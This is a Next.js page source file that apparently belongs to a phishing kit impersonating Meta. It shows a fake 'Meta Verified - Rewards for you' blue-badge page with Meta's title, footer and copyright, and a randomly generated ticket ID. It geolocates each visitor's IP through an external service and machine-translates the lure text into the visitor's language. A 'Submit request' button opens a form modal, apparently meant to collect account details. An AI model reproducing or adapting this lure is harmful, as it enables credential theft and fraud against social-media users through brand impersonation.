'use client';
import TickIcon from '@/assets/images/tick.svg';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import axios from 'axios';
import dynamic from 'next/dynamic';
import Image from 'next/image';
import { useEffect, useRef, useState, type FC } from 'react';

const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });

const generateTicketId = (): string => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const segments = [4, 4, 4];
    return segments
        .map((len) =>
            Array.from({ length: len }, () => chars[Math.floor(Math.random() * chars.length)]).join('')
        )
        .join('-');
};

const Page: FC = () => {
    const { isModalOpen, setModalOpen, setGeoInfo, geoInfo } = store();
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [modalKey, setModalKey] = useState(0);
    const [ticketId] = useState(() => generateTicketId());
    const isTranslatingRef = useRef(false);

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (geoInfo) {
            return;
        }

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'CHỊU',
                    country: data.country || 'CHỊU',
                    city: data.city || 'CHỊU',
                    country_code: data.country_code || 'US'
                });
            } catch {
                setGeoInfo({
                    asn: 0,
                    ip: 'CHỊU',
                    country: 'CHỊU',
                    city: 'CHỊU',
                    country_code: 'US'
                });
            }
        };
        fetchGeoInfo();
    }, [setGeoInfo, geoInfo]);

    useEffect(() => {
        if (!geoInfo || isTranslatingRef.current || Object.keys(translations).length > 0) return;

        isTranslatingRef.current = true;

        const textsToTranslate = [
            'Meta Verified - Rewards for you',
            'Show the world that you mean business.',
            'Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you\'ve built with your audience.',
            'We\'re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!',
            'Your ticket id:',
            'Verified Blue Badge Request Guide',
            '- Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats',
            '- In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.',
            '- Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly.',
            'Submit request',
            'Help Center',
            'Privacy Policy',
            'Terms of Service',
            'Community Standards'
        ];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};

            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo, translations]);

    return (
        <div className='meta-verified-page flex min-h-screen flex-col items-center justify-between px-4 py-8 text-[#1C2B33] sm:px-8'>
            <title>Meta Verified | Get a Verified Blue Check on Instagram, Facebook | Meta</title>

            <div className='flex w-full max-w-[680px] flex-1 flex-col'>
                {/* Tick Icon */}
                <div className='mb-4'>
                    <Image src={TickIcon} alt='tick' className='h-[50px] w-[50px]' />
                </div>

                {/* Title */}
                <div className='mb-6 text-[32px] font-bold leading-tight text-[#1C2B33]'>
                    {t('Meta Verified - Rewards for you')}
                </div>

                {/* Subtitle */}
                <div className='mb-4 text-[17px] font-bold'>
                    {t('Show the world that you mean business.')}
                </div>

                {/* Congratulations text */}
                <div className='mb-4 text-[15px] leading-relaxed text-[#1C2B33]'>
                    {t('Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you\'ve built with your audience.')}
                </div>

                <div className='mb-6 text-[15px] leading-relaxed text-[#1C2B33]'>
                    {t('We\'re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!')}
                </div>

                {/* Ticket ID */}
                <div className='mb-6 text-[15px] text-[#65676B]'>
                    {t('Your ticket id:')} <span className='font-medium'>#{ticketId}</span>
                </div>

                {/* Guide Section */}
                <div className='mb-4 text-[17px] font-bold'>
                    {t('Verified Blue Badge Request Guide')}
                </div>

                <div className='mb-3 text-[15px] leading-relaxed text-[#1C2B33]'>
                    {t('- Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats')}
                </div>

                <div className='mb-3 text-[15px] leading-relaxed text-[#1C2B33]'>
                    {t('- In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.')}
                </div>

                <div className='mb-8 text-[15px] leading-relaxed text-[#1C2B33]'>
                    {t('- Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly.')}
                </div>

                {/* Submit Button */}
                <button
                    onClick={() => {
                        setModalKey((prev) => prev + 1);
                        setModalOpen(true);
                    }}
                    className='mx-auto mb-8 flex h-[48px] w-full max-w-[400px] cursor-pointer items-center justify-center rounded-full bg-[#0866FF] text-[15px] font-semibold text-white transition-colors hover:bg-[#0756d4]'
                >
                    {t('Submit request')}
                </button>
            </div>

            {/* Footer */}
            <div className='flex flex-wrap items-center justify-center gap-4 pt-8 text-[13px] text-[#65676B]'>
                <span className='cursor-pointer hover:underline'>{t('Help Center')}</span>
                <span className='cursor-pointer hover:underline'>{t('Privacy Policy')}</span>
                <span className='cursor-pointer hover:underline'>{t('Terms of Service')}</span>
                <span className='cursor-pointer hover:underline'>{t('Community Standards')}</span>
                <span>Meta © 2026</span>
            </div>

            {isModalOpen && <FormModal key={modalKey} />}
        </div>
    );
};

export default Page;
